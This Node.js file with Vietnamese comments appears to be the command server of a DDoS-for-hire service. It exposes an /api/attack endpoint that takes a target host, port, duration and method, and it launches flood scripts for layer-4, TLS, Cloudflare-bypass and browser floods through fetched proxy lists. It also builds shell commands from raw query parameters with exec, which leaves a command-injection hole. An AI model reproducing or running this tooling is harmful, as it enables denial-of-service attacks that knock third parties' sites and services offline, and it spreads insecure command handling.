const http = require('http');
const https = require('https');
const fs = require('fs');
const { exec } = require('child_process'); // Sử dụng exec để chạy Python
const url = require('url');
const osu = require('os-utils');
const port = 2222;
let lastAPICallTime = Date.now();

// Hàm fetchAndUpdateProxies giữ nguyên
const fetchAndUpdateProxies = () => {
  const apiUrls = [
    'https://api.nminhniee.sbs/hp'
  ];

  const fetchUrl = (url) => {
    const client = url.startsWith('https') ? https : http;
    return new Promise((resolve, reject) => {
      client.get(url, (res) => {
        let data = '';
        res.on('data', (chunk) => {
          data += chunk;
        });
        res.on('end', () => {
          resolve(data);
        });
      }).on('error', (err) => {
        reject(err);
      });
    });
  };

  Promise.all(apiUrls.map(url => fetchUrl(url).catch(err => {
    console.error(`Lỗi khi gọi API ${url}:`, err.message);
    return '';
  })))
    .then(results => {
      const combinedData = results.filter(data => data).join('\n');
      if (!combinedData) {
        console.error('Không có dữ liệu hợp lệ từ các API');
        return;
      }
      fs.writeFile('prx.txt', combinedData, (err) => {
        if (err) {
          console.error('Lỗi khi ghi file prx.txt:', err.message);
        } else {
          console.log('Đã cập nhật prx.txt từ các API');
        }
      });
    })
    .catch(err => {
      console.error('Lỗi khi xử lý dữ liệu API:', err.message);
    });
};

fetchAndUpdateProxies();
setInterval(fetchAndUpdateProxies, 30 * 60 * 1000);

// Hàm runScript sửa để hỗ trợ cả JavaScript và Python
const runScript = (scriptName, args) => {
  if (scriptName.endsWith('.py')) {
    // Chạy file Python
    const command = `python3 ${scriptName} ${args.join(' ')}`; // Sử dụng python3 (hoặc python tùy hệ thống)
    const childProcess = exec(command, (error, stdout, stderr) => {
      if (error) {
        console.error(`Lỗi khi chạy ${scriptName}: ${error.message}`);
        return;
      }
      if (stderr) {
        console.error(`STDERR: ${stderr}`);
        return;
      }
      console.log(`STDOUT: ${stdout}`);
    });

    childProcess.on('message orbital', (message) => {
      console.log(message);
    });
  } else {
    // Chạy file JavaScript
    const childProcess = require('child_process').fork(scriptName, args);

    childProcess.on('error', (err) => {
      console.error(`Lỗi khi chạy ${scriptName}: ${err.message}`);
    });

    childProcess.on('message', (message) => {
      console.log(message);
    });
  }
};

const server = http.createServer((req, res) => {
  const currentTime = Date.now();
  const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const parsedUrl = url.parse(req.url, true);
  const { key, host, port, time, method } = parsedUrl.query;

  if (!host || !port || !time || !method) {
    const err_u = {
      error: true,
      message: 'Sai URL, URL cần phải đủ: /api/attack?host=[url]&port=[port]&method=[methods]&time=[time]',
      code: 410
    };

    res.writeHead(400, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(err_u));
    return;
  }

  if (!port) {
    const err_p = {
      message: 'Thiếu port',
      code: 404
    };

    res.writeHead(400, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(err_p));
    return;
  }


  if (!host) {
    const err_host = {
      message: 'Thiếu host',
      code: 404
    };

    res.writeHead(400, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(err_host));
    return;
  }

  if (
    !(
      method.toLowerCase() === 'tls' ||
      method.toLowerCase() === 'cf' ||
      method.toLowerCase() === 'l4' ||
      method.toLowerCase() === 'https' ||
      method.toLowerCase() === 'vip' ||
      method.toLowerCase() === 'browser'
    )
  ) {
    const err_method = {
      err: true,
      method_valid: 'Sai method',
      code: 403
    };

    res.writeHead(400, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(err_method));
    return;
  }

  osu.cpuUsage((v) => {
    const cpuUsage = v * 100;

    const jsonData = {
      status: 'ok',
      cpu_usage: cpuUsage.toFixed(2),
      code: 200
    };

    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(jsonData));

    lastAPICallTime = currentTime;

    if (method.toLowerCase() === 'tls') {
      runScript('flood1.js', [host, time, '1', '30', 'prx1.txt']);
    } else if (method.toLowerCase() === 'cf') {
      runScript('cf.js', ['GET', host, time, '2', '65', 'prx.txt']);
    } else if (method.toLowerCase() === 'https') {
      runScript('cf.js', ['GET', host, time, '15', '35', 'prx.txt']);
    } else if (method.toLowerCase() === 'vip') {
      runScript('browser.js', [host, time, '4', '1', '65', 'prx.txt']);
    } else if (method.toLowerCase() === 'l4') {
      runScript('r2.py', [host, port, '99', time]);
    } else if (method.toLowerCase() === 'browser') {
      runScript('brs.py', [host, time, '2', '40', 'prx.txt']);
    }
  });
});

server.listen(port, () => {
  console.log(`Server is listening on port ${port}`);
});
